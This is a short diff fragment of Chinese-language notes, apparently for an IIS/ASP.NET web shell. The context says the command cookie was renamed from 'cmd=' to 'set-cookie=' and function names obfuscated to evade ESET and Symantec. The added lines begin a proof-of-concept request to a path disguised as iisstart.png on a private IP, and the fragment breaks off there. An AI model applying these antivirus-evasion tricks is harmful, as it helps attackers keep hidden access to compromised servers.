@@ -4,6 +4,7 @@ Cookie: cmd= 改成 Cookie: set-cookie=，对函数名进行混淆
 
 目前已绕过 eset 和 symantec 
 
+PoC如下
 ```
 GET /aspnet_client/system_web/iisstart.png HTTP/2
 Host: 192.168.42.128
